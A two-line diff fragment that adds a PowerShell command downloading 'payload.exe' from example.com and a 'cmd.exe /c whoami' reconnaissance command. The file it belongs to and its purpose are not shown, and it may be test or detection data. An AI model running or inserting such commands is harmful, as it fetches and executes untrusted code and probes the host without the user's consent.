@@ -1,0 +1,2 @@
+powershell Invoke-WebRequest http://example.com payload.exe
+cmd.exe /c whoami
